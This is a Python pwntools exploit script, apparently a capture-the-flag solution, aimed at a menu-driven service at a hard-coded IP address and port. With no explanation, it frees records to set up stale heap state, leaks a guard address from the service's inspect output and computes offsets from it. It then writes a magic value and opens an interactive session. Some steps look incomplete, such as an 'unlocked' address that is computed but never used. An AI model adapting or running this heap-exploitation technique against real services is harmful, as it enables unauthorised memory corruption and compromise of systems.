#!/usr/bin/env python3
from pwn import *

HOST = "172.235.15.209"
PORT = 1337

p = remote(HOST, PORT)

def menu(c): p.sendlineafter(b"> ", str(c).encode())
def create(s, d): menu(1); p.sendlineafter(b"record size: ", str(s).encode()); p.sendafter(b"record bytes: ", d)
def delete(i): menu(3); p.sendlineafter(b"account id: ", str(i).encode())
def focus(c): menu(4); p.sendlineafter(b"task code: ", str(c).encode())
def patch(o, d): menu(5); p.sendlineafter(b"offset: ", str(o).encode()); p.sendlineafter(b"length: ", str(len(d)).encode()); p.sendafter(b"patch bytes: ", d)
def queue(): menu(6)
def inspect(): menu(7); p.recvuntil(b"diag marker: "); p.recvline(); p.recvuntil(b"worker slot a: "); a=p.recvline().strip(); p.recvuntil(b"worker slot b: "); b=p.recvline().strip(); return a,b
def rebalance(x): menu(8); p.sendlineafter(b"scheduler salt: ", str(x).encode())
def gray(v): return v ^ (v >> 1)

# Create and free
create(0x100, b"A"*0x100)
delete(1)

# Focus
mask = (1 * 0x45d9f3b) >> 5
focus(gray(0 ^ mask))
queue()

# Leak
_, b = inspect()
portal_guard = int(b, 16)
portal_box = portal_guard - 0x30
unlocked = portal_box + 0x20
log.success(f"Unlocked: {hex(unlocked)}")

# Use rebalance to manipulate
rebalance(0x1337)

# Now we can write directly
create(0x100, p64(0x47524f56455f4f4b))
delete(2)

mask = (2 * 0x45d9f3b) >> 5
focus(gray(1 ^ mask))
queue()

# Try to open
menu(9)
log.info(p.recvline())

p.interactive()
